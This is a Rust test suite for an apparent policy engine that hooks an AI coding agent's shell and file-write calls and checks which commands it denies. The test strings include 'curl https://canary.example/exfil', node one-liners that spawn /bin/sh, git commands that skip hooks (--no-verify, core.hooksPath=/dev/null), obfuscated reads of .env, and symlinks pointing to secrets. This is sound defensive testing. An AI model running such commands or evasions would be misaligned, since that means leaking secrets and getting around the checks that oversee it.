        never_ask(&leak);
        let hello = shell_at(&engine, &sessions, "a-hello", "python hello.py", ws.to_str().unwrap());
        assert_eq!(hello.stdout["permission"], "deny", "python hello.py");
        assert!(hello.policy_ids.contains(&"F-DEF-09".into()), "{:?}", hello.policy_ids);
        assert!(!hello.policy_ids.contains(&"F-DEF-03".into()), "{:?}", hello.policy_ids);
        assert_eq!(hello.stdout["user_message"], "fairlead deny: F-DEF-09");
        never_ask(&hello);
        let node_leak = shell_at(&engine, &sessions, "a-node", "node exfil.js", ws.to_str().unwrap());
        assert_eq!(node_leak.stdout["permission"], "deny", "node fetch");
        let node_ok = shell_at(&engine, &sessions, "a-nodeok", "node hello.js", ws.to_str().unwrap());
        assert_eq!(node_ok.stdout["permission"], "deny", "node hello.js");
        assert!(node_ok.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_ok.policy_ids);
        let pym = shell_at(
            &engine,
            &sessions,
            "a-pym",
            "python -m pytest",
            ws.to_str().unwrap(),
        );
        assert_eq!(pym.stdout["permission"], "deny", "python -m pytest");
        assert!(pym.policy_ids.contains(&"F-DEF-09".into()), "{:?}", pym.policy_ids);
        assert!(!pym.policy_ids.contains(&"F-DEF-03".into()), "{:?}", pym.policy_ids);
        assert_eq!(pym.stdout["user_message"], "fairlead deny: F-DEF-09");

        let py3m = shell_at(
            &engine,
            &sessions,
            "a-py3m",
            "python3 -m pytest",
            ws.to_str().unwrap(),
        );
        assert_eq!(py3m.stdout["permission"], "deny", "python3 -m pytest");
        assert!(py3m.policy_ids.contains(&"F-DEF-09".into()), "{:?}", py3m.policy_ids);
        assert!(!py3m.policy_ids.contains(&"F-DEF-03".into()), "{:?}", py3m.policy_ids);
        let py3_abs = shell_at(
            &engine,
            &sessions,
            "a-py3abs",
            "/usr/bin/python3 -m pytest",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py3_abs.stdout["permission"],
            "deny",
            "/usr/bin/python3 -m pytest"
        );
        assert!(py3_abs.policy_ids.contains(&"F-DEF-09".into()), "{:?}", py3_abs.policy_ids);
        assert!(!py3_abs.policy_ids.contains(&"F-DEF-03".into()), "{:?}", py3_abs.policy_ids);
        let py3_http = shell_at(
            &engine,
            &sessions,
            "a-py3http",
            "python3 -m http.server",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py3_http.stdout["permission"],
            "deny",
            "python3 -m http.server"
        );
        never_ask(&py3_http);
        let py312 = shell_at(
            &engine,
            &sessions,
            "a-py312",
            "python3.12 -m pytest",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py312.stdout["permission"],
            "deny",
            "python3.12 -m pytest"
        );
        assert!(py312.policy_ids.contains(&"F-DEF-09".into()), "{:?}", py312.policy_ids);
        assert!(!py312.policy_ids.contains(&"F-DEF-03".into()), "{:?}", py312.policy_ids);
        let py312_http = shell_at(
            &engine,
            &sessions,
            "a-py312h",
            "python3.12 -m http.server",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py312_http.stdout["permission"],
            "deny",
            "python3.12 -m http.server"
        );

        let py_http = shell_at(
            &engine,
            &sessions,
            "a-pym-http",
            "python -m http.server",
            ws.to_str().unwrap(),
        );
        assert_eq!(py_http.stdout["permission"], "deny", "python -m http.server");
        never_ask(&py_http);
        let py_glued = shell_at(
            &engine,
            &sessions,
            "a-pym-glued",
            "python -mhttp.server",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py_glued.stdout["permission"],
            "deny",
            "python -mhttp.server"
        );
        let py_u = shell_at(
            &engine,
            &sessions,
            "a-pym-u",
            "python -u -m http.server",
            ws.to_str().unwrap(),
        );
        assert_eq!(py_u.stdout["permission"], "deny", "python -u -m http.server");
        let py_unk = shell_at(
            &engine,
            &sessions,
            "a-pym-unk",
            "python -m not_a_real_module",
            ws.to_str().unwrap(),
        );
        assert_eq!(py_unk.stdout["permission"], "deny", "python -m unknown");
        let py_pip = shell_at(
            &engine,
            &sessions,
            "a-pym-pip",
            "python -m pip",
            ws.to_str().unwrap(),
        );
        assert_eq!(py_pip.stdout["permission"], "deny", "python -m pip");
        let py_m_miss = shell_at(&engine, &sessions, "a-pym-miss", "python -m", ws.to_str().unwrap());
        assert_eq!(py_m_miss.stdout["permission"], "deny", "python -m missing");
        std::fs::write(ws.join("serve.py"), "import http.server\n").expect("serve");
        let serve = shell_at(
            &engine,
            &sessions,
            "a-serve",
            "python serve.py",
            ws.to_str().unwrap(),
        );
        assert_eq!(serve.stdout["permission"], "deny", "python serve.py http.server");
        let node_m = shell_at(
            &engine,
            &sessions,
            "a-nodem",
            "node -m anything",
            ws.to_str().unwrap(),
        );
        assert_eq!(node_m.stdout["permission"], "deny", "node -m");

        let py_c_net = shell_at(
            &engine,
            &sessions,
            "a-pyc-net",
            r#"python -c "import urllib.request""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(py_c_net.stdout["permission"], "deny", "python -c urllib");
        never_ask(&py_c_net);
        let py_c_ok = shell_at(
            &engine,
            &sessions,
            "a-pyc-ok",
            r#"python -c "print(1)""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(py_c_ok.stdout["permission"], "deny", "python -c print");
        assert!(py_c_ok.policy_ids.contains(&"F-DEF-09".into()), "{:?}", py_c_ok.policy_ids);
        assert!(!py_c_ok.policy_ids.contains(&"F-DEF-03".into()), "{:?}", py_c_ok.policy_ids);
        assert_eq!(py_c_ok.stdout["user_message"], "fairlead deny: F-DEF-09");
        never_ask(&py_c_ok);
        let py_stdin = shell_at(&engine, &sessions, "a-pystdin", "python -", ws.to_str().unwrap());
        assert_eq!(py_stdin.stdout["permission"], "deny", "python -");
        never_ask(&py_stdin);
        let py_c_unmatched = shell_at(
            &engine,
            &sessions,
            "a-pyc-uq",
            r#"python -c "print(1)"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            py_c_unmatched.stdout["permission"],
            "deny",
            "unmatched -c quotes"
        );
        let node_e_net = shell_at(
            &engine,
            &sessions,
            "a-nodee",
            r#"node -e "fetch('http://127.0.0.1/hit')""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_e_net.stdout["permission"], "deny", "node -e fetch");
        let node_e_ok = shell_at(
            &engine,
            &sessions,
            "a-nodeeok",
            r#"node -e "console.log(1)""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_e_ok.stdout["permission"], "deny", "node -e console");
        assert!(node_e_ok.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_e_ok.policy_ids);
        assert_eq!(node_e_ok.stdout["user_message"], "fairlead deny: F-DEF-09");
        let node_e_http = shell_at(
            &engine,
            &sessions,
            "a-nodeehttp",
            r#"node -e 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_e_http.stdout["permission"],
            "deny",
            "node -e require http"
        );
        let node_eval_http = shell_at(
            &engine,
            &sessions,
            "a-nodeeval",
            r#"node --eval 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_http.stdout["permission"],
            "deny",
            "node --eval require http"
        );
        let node_eval_ok = shell_at(
            &engine,
            &sessions,
            "a-nodeevalok",
            r#"node --eval "console.log(1)""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_ok.stdout["permission"],
            "deny",
            "node --eval console"
        );
        assert!(
            node_eval_ok.policy_ids.contains(&"F-DEF-09".into()),
            "{:?}",
            node_eval_ok.policy_ids
        );
        assert_eq!(node_eval_ok.stdout["user_message"], "fairlead deny: F-DEF-09");
        let node_eval_child = shell_at(
            &engine,
            &sessions,
            "a-nodeevalcp",
            r#"node --eval 'require("child_process").spawn("/bin/sh")'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_child.stdout["permission"],
            "deny",
            "node --eval child_process spawn"
        );
        let node_eval_httpserver = shell_at(
            &engine,
            &sessions,
            "a-nodeevalhs",
            r#"node --eval 'http.createServer().listen(8080)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_httpserver.stdout["permission"],
            "deny",
            "node --eval REPL-bare http.createServer"
        );
        let node_eval_netserver = shell_at(
            &engine,
            &sessions,
            "a-nodeevalns",
            r#"node --eval 'net.createServer().listen(12345)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_netserver.stdout["permission"],
            "deny",
            "node --eval REPL-bare net.createServer"
        );
        let node_print = shell_at(
            &engine,
            &sessions,
            "a-nodeprint",
            r#"node --print 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_print.stdout["permission"], "deny", "node --print");
        let node_p = shell_at(
            &engine,
            &sessions,
            "a-nodep",
            r#"node -p 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_p.stdout["permission"], "deny", "node -p");
        let node_glued = shell_at(
            &engine,
            &sessions,
            "a-nodeglued",
            r#"node '--eval=require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_glued.stdout["permission"], "deny", "node --eval=");
        let node_pe = shell_at(
            &engine,
            &sessions,
            "a-nodepe",
            r#"node -pe 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(node_pe.stdout["permission"], "deny", "node -pe");
        let node_itype = shell_at(
            &engine,
            &sessions,
            "a-nodeitype",
            r#"node --input-type=module --eval 'require("http").createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_itype.stdout["permission"],
            "deny",
            "node --input-type=module --eval"
        );
        let node_eval_https = shell_at(
            &engine,
            &sessions,
            "a-nodeevalhttps",
            r#"node --eval 'https.createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_https.stdout["permission"],
            "deny",
            "node --eval REPL-bare https.createServer"
        );
        let node_eval_tls = shell_at(
            &engine,
            &sessions,
            "a-nodeevaltls",
            r#"node --eval 'tls.createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_tls.stdout["permission"],
            "deny",
            "node --eval REPL-bare tls.createServer"
        );
        let node_eval_http2 = shell_at(
            &engine,
            &sessions,
            "a-nodeevalhttp2",
            r#"node --eval 'http2.createServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_http2.stdout["permission"],
            "deny",
            "node --eval REPL-bare http2.createServer"
        );
        let node_eval_http2s = shell_at(
            &engine,
            &sessions,
            "a-nodeevalhttp2s",
            r#"node --eval 'http2.createSecureServer()'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_eval_http2s.stdout["permission"],
            "deny",
            "node --eval REPL-bare http2.createSecureServer"
        );
        let node_dash = shell_at(&engine, &sessions, "a-nodedash", "node -", ws.to_str().unwrap());
        assert_eq!(node_dash.stdout["permission"], "deny", "node -");
        never_ask(&node_dash);
        let node_bare = shell_at(&engine, &sessions, "a-nodebare", "node", ws.to_str().unwrap());
        assert_eq!(node_bare.stdout["permission"], "deny", "bare node");
        assert!(node_bare.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_bare.policy_ids);
        let node_ver = shell_at(
            &engine,
            &sessions,
            "a-nodever",
            "node --version",
            ws.to_str().unwrap(),
        );
        assert_eq!(node_ver.stdout["permission"], "deny", "node --version");
        assert!(node_ver.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_ver.policy_ids);
        let node_r_miss = shell_at(&engine, &sessions, "a-nodermiss", "node -r", ws.to_str().unwrap());
        assert_eq!(node_r_miss.stdout["permission"], "deny", "node -r missing");
        std::fs::write(ws.join("pwn.js"), "require(\"child_process\").spawn(\"/bin/sh\")\n")
            .expect("pwn");
        std::fs::write(ws.join("preload.js"), "console.log(1)\n").expect("preload");
        let node_r_dot = shell_at(
            &engine,
            &sessions,
            "a-noderdot",
            r#"node -r ./pwn.js -e 'console.log(1)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_dot.stdout["permission"],
            "deny",
            "node -r ./pwn.js before -e"
        );
        let node_r_cwd = shell_at(
            &engine,
            &sessions,
            "a-nodercwd",
            r#"node -r pwn.js -e 'console.log(1)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_cwd.stdout["permission"],
            "deny",
            "node -r pwn.js cwd SCRIPT_EXT"
        );
        let node_r_glued = shell_at(
            &engine,
            &sessions,
            "a-noderglued",
            r#"node --require=./pwn.js -e 'console.log(1)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_glued.stdout["permission"],
            "deny",
            "node --require=./pwn.js"
        );
        let node_r_ok = shell_at(
            &engine,
            &sessions,
            "a-noderok",
            "node -r ./preload.js hello.js",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_ok.stdout["permission"],
            "deny",
            "node -r ./preload.js hello.js"
        );
        assert!(node_r_ok.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_r_ok.policy_ids);
        let node_r_ts = shell_at(
            &engine,
            &sessions,
            "a-noderts",
            "node -r ts-node/register hello.js",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_ts.stdout["permission"],
            "deny",
            "node -r ts-node/register"
        );
        assert!(node_r_ts.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_r_ts.policy_ids);
        let node_r_dotenv = shell_at(
            &engine,
            &sessions,
            "a-noderdotenv",
            "node -r dotenv/config hello.js",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_dotenv.stdout["permission"],
            "deny",
            "node -r dotenv/config"
        );
        assert!(
            node_r_dotenv.policy_ids.contains(&"F-DEF-09".into()),
            "{:?}",
            node_r_dotenv.policy_ids
        );
        let node_r_http = shell_at(
            &engine,
            &sessions,
            "a-noderhttp",
            r#"node -r http -e 'console.log(1)'"#,
            ws.to_str().unwrap(),
        );
        assert_eq!(
            node_r_http.stdout["permission"],
            "deny",
            "node -r http"
        );
        assert!(node_r_http.policy_ids.contains(&"F-DEF-09".into()), "{:?}", node_r_http.policy_ids);

        let nv = shell_at(
            &engine,
            &sessions,
            "a-nv",
            "git commit --no-verify",
            ws.to_str().unwrap(),
        );
        assert_eq!(nv.stdout["permission"], "deny", "--no-verify");
        let nv_c = shell_at(
            &engine,
            &sessions,
            "a-nvc",
            "git -c foo commit --no-verify",
            ws.to_str().unwrap(),
        );
        assert_eq!(nv_c.stdout["permission"], "deny", "git -c --no-verify");

        let hp = shell_at(
            &engine,
            &sessions,
            "a-hp",
            "git -c core.hooksPath=/dev/null commit",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp.stdout["permission"], "deny", "hooksPath /dev/null");
        let hp_tmp = shell_at(
            &engine,
            &sessions,
            "a-hpt",
            "git -c core.hooksPath=/tmp/x commit",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp_tmp.stdout["permission"], "deny", "hooksPath /tmp/x");
        let hp_cfg = shell_at(
            &engine,
            &sessions,
            "a-hpc",
            "git config core.hooksPath /dev/null",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp_cfg.stdout["permission"], "deny", "git config hooksPath");
        let hp_get = shell_at(
            &engine,
            &sessions,
            "a-hpg",
            "git config --get core.hooksPath",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp_get.stdout["permission"], "allow", "git config --get");
        let color = shell_at(
            &engine,
            &sessions,
            "a-color",
            "git -c color.ui=true status",
            ws.to_str().unwrap(),
        );
        assert_eq!(color.stdout["permission"], "allow", "git -c color.ui");
        let env_nv = shell_at(
            &engine,
            &sessions,
            "a-envnv",
            "FOO=1 git commit --no-verify",
            ws.to_str().unwrap(),
        );
        assert_eq!(env_nv.stdout["permission"], "deny", "FOO=1 --no-verify");
        let hp_eq = shell_at(
            &engine,
            &sessions,
            "a-hpeq",
            r"git -c core.hooksPath$'\x3d'/dev/null commit",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp_eq.stdout["permission"], "deny", r"hooksPath$'\x3d'");
        let nv_ansi = shell_at(
            &engine,
            &sessions,
            "a-nva",
            r"git commit --no$'\x2d'verify",
            ws.to_str().unwrap(),
        );
        assert_eq!(nv_ansi.stdout["permission"], "deny", r"--no$'\x2d'verify");
        let hp_fake_get = shell_at(
            &engine,
            &sessions,
            "a-hpfg",
            "git config core.hooksPath /tmp/x--get",
            ws.to_str().unwrap(),
        );
        assert_eq!(hp_fake_get.stdout["permission"], "deny", "hooksPath value --get");

        let ansi = shell_at(&engine, &sessions, "a-ansi", "ls $'.env'", ws.to_str().unwrap());
        assert_eq!(ansi.stdout["permission"], "deny", "ls $'.env'");
        let ansi_hex = shell_at(
            &engine,
            &sessions,
            "a-ansix",
            r"ls $'\x2eenv'",
            ws.to_str().unwrap(),
        );
        assert_eq!(ansi_hex.stdout["permission"], "deny", r"ls $'\x2eenv'");
        let ansi_git = shell_at(
            &engine,
            &sessions,
            "a-ansig",
            "git show $'.env'",
            ws.to_str().unwrap(),
        );
        assert_eq!(ansi_git.stdout["permission"], "deny", "git show $'.env'");
        let ansi_cat = shell_at(
            &engine,
            &sessions,
            "a-ansic",
            r"ls $'.en'$'\x76'",
            ws.to_str().unwrap(),
        );
        assert_eq!(ansi_cat.stdout["permission"], "deny", "ANSI-C concat .env");

        let subst = shell_at(
            &engine,
            &sessions,
            "a-sub",
            "ls $(printf .env)",
            ws.to_str().unwrap(),
        );
        assert_eq!(subst.stdout["permission"], "deny", "ls $(printf .env)");
        let subst_bt = shell_at(
            &engine,
            &sessions,
            "a-bt",
            "ls `printf .env`",
            ws.to_str().unwrap(),
        );
        assert_eq!(subst_bt.stdout["permission"], "deny", "ls backticks");
        let var_file = shell_at(
            &engine,
            &sessions,
            "a-var",
            "ls $FILE",
            ws.to_str().unwrap(),
        );
        assert_eq!(var_file.stdout["permission"], "deny", "ls $FILE");
        never_ask(&var_file);
        let var_brace = shell_at(
            &engine,
            &sessions,
            "a-varb",
            "ls ${FILE}",
            ws.to_str().unwrap(),
        );
        assert_eq!(var_brace.stdout["permission"], "deny", "ls brace FILE");
        let var_dq = shell_at(
            &engine,
            &sessions,
            "a-vardq",
            r#"ls "$FILE""#,
            ws.to_str().unwrap(),
        );
        assert_eq!(var_dq.stdout["permission"], "deny", r#"ls "$FILE""#);
        let commit_home = shell_at(
            &engine,
            &sessions,
            "a-chome",
            "git commit -m '$HOME'",
            ws.to_str().unwrap(),
        );
        assert_eq!(
            commit_home.stdout["permission"],
            "allow",
            "git commit -m '$HOME'"
        );
        never_ask(&commit_home);
        let echo_path = shell_at(
            &engine,
            &sessions,
            "a-echo",
            "echo $PATH",
            ws.to_str().unwrap(),
        );
        assert_eq!(echo_path.stdout["permission"], "deny", "echo $PATH argv0");
        never_ask(&echo_path);
        let commit_n = shell_at(
            &engine,
            &sessions,
            "a-cn",
            "git commit -n",
            ws.to_str().unwrap(),
        );
        assert_eq!(commit_n.stdout["permission"], "deny", "git commit -n");
        let commit_an = shell_at(
            &engine,
            &sessions,
            "a-can",
            "git commit -an",
            ws.to_str().unwrap(),
        );
        assert_eq!(commit_an.stdout["permission"], "deny", "git commit -an");
        let push_n = shell_at(
            &engine,
            &sessions,
            "a-pn",
            "git push -n",
            ws.to_str().unwrap(),
        );
        assert_eq!(push_n.stdout["permission"], "allow", "git push -n dry-run");
        let merge_n = shell_at(
            &engine,
            &sessions,
            "a-mn",
            "git merge -n",
            ws.to_str().unwrap(),
        );
        assert_eq!(merge_n.stdout["permission"], "allow", "git merge -n");

        #[cfg(unix)]
        {
            std::fs::write(ws.join(".env"), "SECRET=1\n").expect("env");
            std::os::unix::fs::symlink(ws.join(".env"), ws.join("notes.md")).expect("symlink");
            let notes = ws.join("notes.md");
            let deny = cursor_pretool_in(
                &format!(
                    r#"{{"conversation_id":"a-sym","tool_name":"Write","tool_input":{{"file_path":{},"contents":"x"}}}}"#,
                    serde_json::to_string(notes.to_str().unwrap()).expect("path")
                ),
                &sessions,
                &engine,
            );
            assert_eq!(deny.stdout["permission"], "deny", "notes.md -> .env Write");

            let dang = ws.join("dangling.md");
            std::os::unix::fs::symlink(".env", &dang).expect("dangling");
            let _ = std::fs::remove_file(ws.join(".env"));
            let dang_eval = cursor_pretool_in(
                &format!(
                    r#"{{"conversation_id":"a-dang","tool_name":"Write","tool_input":{{"file_path":{},"contents":"x"}}}}"#,
                    serde_json::to_string(dang.to_str().unwrap()).expect("path")
                ),
                &sessions,
                &engine,
            );
            assert_eq!(
                dang_eval.stdout["permission"],
                "deny",
                "dangling notes -> .env"
            );

            std::fs::write(ws.join(".env"), "SECRET=1\n").expect("env2");
            let mid = ws.join("mid");
            std::os::unix::fs::symlink(".env", &mid).expect("mid");
            let outer = ws.join("outer.md");
            std::os::unix::fs::symlink(&mid, &outer).expect("outer");
            let _ = std::fs::remove_file(ws.join(".env"));
            let chain = cursor_pretool_in(
                &format!(
                    r#"{{"conversation_id":"a-chain","tool_name":"Write","tool_input":{{"file_path":{},"contents":"x"}}}}"#,
                    serde_json::to_string(outer.to_str().unwrap()).expect("path")
                ),
                &sessions,
                &engine,
            );
            assert_eq!(
                chain.stdout["permission"],
                "deny",
                "a -> b -> .env with .env missing"
            );
        }

        let _ = std::fs::remove_dir_all(&sessions);
        let _ = std::fs::remove_dir_all(&ws);
    }

    #[test]
    fn posix_split_strips_quotes() {
        assert_eq!(posix_split(r#"ls ".env""#), ["ls", ".env"]);
        assert_eq!(posix_split("ls '.env'"), ["ls", ".env"]);
        assert_eq!(posix_split("git show .env"), ["git", "show", ".env"]);
        assert_eq!(posix_split("ls $'.env'"), ["ls", ".env"]);
        assert_eq!(posix_split(r"ls $'\x2eenv'"), ["ls", ".env"]);
        assert_eq!(posix_split("git show $'.env'"), ["git", "show", ".env"]);
        assert_eq!(posix_split(r"$'\056env'"), [".env"]);
        assert_eq!(posix_split(r"$'.en'$'\x76'"), [".env"]);
        assert_eq!(posix_split(r"cred$'\x65'ntials"), ["credentials"]);
        assert_eq!(
            posix_split(r"git -c core.hooksPath$'\x3d'/dev/null commit"),
            ["git", "-c", "core.hooksPath=/dev/null", "commit"]
        );
        assert_eq!(posix_split(r"ls $'.env\x00x'"), ["ls", ".env"]);
        assert_eq!(posix_split("ls $FILE"), ["ls", "$FILE"]);
        assert_eq!(posix_split("ls ${FILE}"), ["ls", "${FILE}"]);
        assert_eq!(posix_split(r#"ls "$FILE""#), ["ls", "$FILE"]);
        assert_eq!(
            posix_split("git commit -m '$HOME'"),
            ["git", "commit", "-m", "$HOME"]
        );
        assert!(posix_split_ex("ls $FILE").has_param_expansion);
        assert!(posix_split_ex("ls ${FILE}").has_param_expansion);
        assert!(posix_split_ex(r#"ls "$FILE""#).has_param_expansion);
        assert!(!posix_split_ex("git commit -m '$HOME'").has_param_expansion);
        assert!(!posix_split_ex("git status").has_param_expansion);
        assert!(!posix_split_ex("ls $'.env'").has_param_expansion);
        assert!(!posix_split_ex(r"ls \$FILE").has_param_expansion);
        assert!(posix_split_ex(r#"python -c "print(1)"#).unmatched);
        assert!(!posix_split_ex(r#"python -c "print(1)""#).unmatched);
    }

    #[test]
    fn suite7_observe_would_deny_without_blocking() {
        let engine = live_engine();
        let dir = temp_sessions();
        let obs = dir.join("observe.jsonl");
        let cid = "conv-obs-7";
        let curl = format!(
            r#"{{"conversation_id":"{cid}","command":"curl https://canary.example/exfil","cwd":"/tmp/ws","sandbox":false}}"#
        );
        let shadow = cursor_hook_shadow_in("shell", &curl, &engine, &dir, &obs);
        assert_eq!(shadow.exit, 0);
        assert_eq!(shadow.stdout["permission"], "allow");
        never_ask(&shadow);
        assert!(
            shadow.policy_ids.contains(&"F-DEF-03".into()),
            "{:?}",
            shadow.policy_ids
        );
        let raw = std::fs::read_to_string(&obs).expect("observe jsonl");
        let line: serde_json::Value =
            serde_json::from_str(raw.lines().next().expect("line")).expect("json");
        assert_eq!(line["would_deny"], true);
        assert_eq!(line["errored"], false);
        let ids = line["policy_ids"].as_array().expect("ids");
        assert!(
            ids.iter().any(|v| v.as_str() == Some("F-DEF-03")),
            "{ids:?}"
        );
        assert!(
            crate::load_session(&dir, cid)
                .expect("load")
                .is_none(),
            "shadow must not write session"
        );

        let pytest = format!(
            r#"{{"conversation_id":"{cid}","command":"ls","cwd":"/tmp/ws","sandbox":true}}"#
        );
        let armed_py = cursor_hook_eval_in("shell", &pytest, &engine, &dir);
        assert_eq!(armed_py.exit, 0, "shadow curl must not taint session");
        never_ask(&armed_py);

        let shadow_py = cursor_hook_shadow_in("shell", &pytest, &engine, &dir, &obs);
        assert_eq!(shadow_py.exit, 0);
        assert_eq!(shadow_py.stdout["permission"], "allow");
        let raw2 = std::fs::read_to_string(&obs).expect("observe jsonl");
        let last = raw2.lines().last().expect("last");
        let line2: serde_json::Value = serde_json::from_str(last).expect("json");
        assert_eq!(line2["would_deny"], false);

        let armed_curl = cursor_hook_eval_in("shell", &curl, &engine, &dir);
        assert_eq!(armed_curl.exit, 2);
        assert_eq!(armed_curl.stdout["permission"], "deny");
        assert!(armed_curl.policy_ids.contains(&"F-DEF-03".into()));
        never_ask(&armed_curl);
        let _ = std::fs::remove_dir_all(&dir);
    }
}
